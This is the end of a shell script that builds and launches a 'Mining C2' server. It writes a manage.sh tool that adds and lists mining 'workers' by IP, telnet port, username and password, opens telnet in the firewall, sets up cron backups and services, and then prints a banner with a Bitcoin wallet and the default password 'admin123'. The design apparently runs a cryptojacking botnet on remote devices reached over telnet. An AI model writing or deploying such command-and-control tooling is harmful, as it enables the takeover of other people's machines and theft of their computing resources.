config_file = Path('/opt/mining_c2/config/workers.json')
if config_file.exists():
    with open(config_file, 'r') as f:
        workers = json.load(f)
    for w in workers:
        print(f\"{w['ip']}:{w.get('port', 23)} - {w.get('worker_name', 'Unnamed')}\")
"
        ;;
    test)
        echo "Testing database connection..."
        mysql -u root -p${DB_PASSWORD} -e "SELECT COUNT(*) FROM mining_workers;" ${DB_NAME}
        echo "Testing web server..."
        curl -k https://localhost:${WEB_PORT}
        ;;
    backup)
        BACKUP_FILE="/opt/mining_c2/backup_$(date +%Y%m%d_%H%M%S).sql"
        mysqldump -u root -p${DB_PASSWORD} ${DB_NAME} > $BACKUP_FILE
        echo "Backup saved to $BACKUP_FILE"
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status|logs|add-worker|list-workers|test|backup}"
        exit 1
        ;;
esac
EOF

chmod +x /opt/mining_c2/manage.sh

echo "[*] Setting up firewall rules..."
ufw allow ${WEB_PORT}/tcp comment 'HTTPS Mining C2'
ufw allow 22/tcp comment 'SSH'
ufw allow 23/tcp comment 'Telnet'
ufw --force enable

echo "[*] Setting up automatic updates..."
cat > /etc/cron.daily/mining-c2-backup << 'EOF'
#!/bin/bash
/opt/mining_c2/manage.sh backup
find /opt/mining_c2 -name "backup_*.sql" -mtime +7 -delete
EOF
chmod +x /etc/cron.daily/mining-c2-backup

echo "[*] Setting permissions..."
chown -R root:root /opt/mining_c2
chmod -R 755 /opt/mining_c2
chmod 600 /opt/mining_c2/.env
chmod 600 /opt/mining_c2/ssl/*.pem

echo "[*] Starting services..."
systemctl daemon-reload
systemctl enable mariadb redis-server nginx mining-c2
systemctl restart mariadb redis-server nginx mining-c2

echo "[*] Waiting for services to start..."
sleep 10

echo "[*] Testing setup..."
systemctl status mariadb --no-pager
systemctl status redis-server --no-pager
systemctl status nginx --no-pager
systemctl status mining-c2 --no-pager

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║                    SETUP COMPLETE!                            ║"
echo "╠════════════════════════════════════════════════════════════════╣"
echo "║                                                                  ║"
echo "║  Access Information:                                            ║"
echo "║  ─────────────────                                             ║"
echo "║  Web Interface: https://${HOSTNAME}:${WEB_PORT}                ║"
echo "║  Login Password: admin123                                       ║"
echo "║                                                                  ║"
echo "║  Database:                                                      ║"
echo "║  ─────────                                                      ║"
echo "║  Name: ${DB_NAME}                                               ║"
echo "║  User: root                                                     ║"
echo "║  Password: ${DB_PASSWORD}                                       ║"
echo "║                                                                  ║"
echo "║  Bitcoin Wallet: ${BTC_WALLET}                                  ║"
echo "║                                                                  ║"
echo "║  Management Commands:                                           ║"
echo "║  ───────────────────                                           ║"
echo "║  /opt/mining_c2/manage.sh {start|stop|restart|status|logs}     ║"
echo "║  /opt/mining_c2/manage.sh add-worker IP PORT USER PASS [NAME]  ║"
echo "║  /opt/mining_c2/manage.sh list-workers                          ║"
echo "║  /opt/mining_c2/manage.sh test                                  ║"
echo "║  /opt/mining_c2/manage.sh backup                                ║"
echo "║                                                                  ║"
echo "║  Important Files:                                               ║"
echo "║  ─────────────────                                              ║"
echo "║  Config:      /opt/mining_c2/.env                               ║"
echo "║  Workers:     /opt/mining_c2/config/workers.json                ║"
echo "║  Logs:        /opt/mining_c2/logs/                              ║"
echo "║  SSL Certs:   /opt/mining_c2/ssl/                               ║"
echo "║                                                                  ║"
echo "║  To add workers via API:                                        ║"
echo "║  curl -k -X POST https://${HOSTNAME}:${WEB_PORT}/api/workers/add \\"
echo "║    -H \"Content-Type: application/json\" \\"
echo "║    -d '{\"ip\":\"1.2.3.4\",\"port\":23,\"username\":\"root\",\"password\":\"pass\"}' \\"
echo "║    -b cookies.txt                                               ║"
echo "║                                                                  ║"
echo "╚════════════════════════════════════════════════════════════════╝"

echo ""
echo "[!] IMPORTANT: Please change the default passwords:"
echo "    - Web interface password in /opt/mining_c2/.env (WEB_PASSWORD)"
echo "    - Database root password (run: mysql_secure_installation)"
echo "    - Consider setting up SSL with real certificates (certbot)"
echo ""
echo "[*] Setup complete! System will now reboot in 10 seconds..."
sleep 10
reboot
EOF

chmod +x setup_complete_mining_c2.sh

echo "Setup script created as setup_complete_mining_c2.sh"
echo "Run it with: sudo bash setup_complete_mining_c2.sh"
